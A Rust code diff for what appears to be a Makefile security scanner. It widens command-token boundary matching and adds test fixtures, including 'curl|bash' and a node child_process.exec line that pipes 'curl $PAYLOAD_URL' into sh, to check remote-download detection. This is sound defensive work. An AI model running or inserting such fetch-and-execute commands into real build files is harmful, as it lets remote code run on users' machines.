@@ -110,7 +110,16 @@ fn command_token_with_boundary(lower_line: &str, token: &str) -> bool {
             || make_prefix_ok
             || matches!(
                 before,
-                Some(b' ') | Some(b'\t') | Some(b'|') | Some(b';') | Some(b'&') | Some(b'/')
+                Some(b' ')
+                    | Some(b'\t')
+                    | Some(b'|')
+                    | Some(b';')
+                    | Some(b'&')
+                    | Some(b'/')
+                    | Some(b'(')
+                    | Some(b'"')
+                    | Some(b'\'')
+                    | Some(b'`')
             );
         let after = lower_line.get(token_end..).unwrap_or("");
         let right_ok = after.is_empty()
@@ -254,22 +263,30 @@ mod tests {
     /// invocations even when there is no trailing space after `curl`.
     #[test]
     fn analyze_makefile_detects_pipe_joined_curl() {
-        let content = "all:\n\tcurl|bash\n";
-        let findings = analyze_makefile(Path::new("Makefile"), content);
-        assert_eq!(findings.len(), 1);
-        assert_eq!(findings[0].rule_id, "MANIFEST_MAKEFILE_REMOTE_DOWNLOAD");
+        for content in [
+            "all:\n\tcurl|bash\n",
+            "all:\n\tnode -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
+        ] {
+            let findings = analyze_makefile(Path::new("Makefile"), content);
+            assert_eq!(findings.len(), 1, "{content:?} must raise one finding");
+            assert_eq!(findings[0].rule_id, "MANIFEST_MAKEFILE_REMOTE_DOWNLOAD");
+        }
     }
 
     /// Contract: lookalike words containing `curl` or `wget` are not
     /// command invocations and must not raise download findings.
     #[test]
     fn analyze_makefile_rejects_remote_download_substrings() {
-        let content = "all:\n\t@echo uncurl prewget pre-wget\n";
-        let findings = analyze_makefile(Path::new("Makefile"), content);
-        assert!(
-            findings.is_empty(),
-            "lookalike words must not raise remote-download finding; got {findings:?}",
-        );
+        for content in [
+            "all:\n\t@echo uncurl prewget pre-wget\n",
+            "all:\n\tnode -e \"require('child_process').exec('mycurl\t$PAYLOAD_URL')\"\n",
+        ] {
+            let findings = analyze_makefile(Path::new("Makefile"), content);
+            assert!(
+                findings.is_empty(),
+                "lookalike words must not raise remote-download finding for {content:?}; got {findings:?}",
+            );
+        }
     }
 
     /// Contract: an inline comment mentioning `wget` does not flip the
@@ -291,6 +308,7 @@ mod tests {
         for content in [
             "all:\n\t@curl https://x\n",
             "all:\n\t-/usr/bin/wget https://x\n",
+            "all:\n\tnode -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
         ] {
             let caps = makefile_capabilities(content);
             assert!(
@@ -303,9 +321,16 @@ mod tests {
     /// Contract: boundary-aware detection applies to relations too.
     #[test]
     fn makefile_relations_detects_pipe_joined_download_command() {
-        let content = "all:\n\tcurl|bash\n";
-        let links = makefile_relations(content);
-        assert!(relation_target_present(&links, "remote-resource"));
+        for content in [
+            "all:\n\tcurl|bash\n",
+            "all:\n\tnode -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
+        ] {
+            let links = makefile_relations(content);
+            assert!(
+                relation_target_present(&links, "remote-resource"),
+                "{content:?} must produce a remote-resource relation; got {links:?}",
+            );
+        }
     }
 
     /// Contract: an inline comment mentioning `bash` does not flip
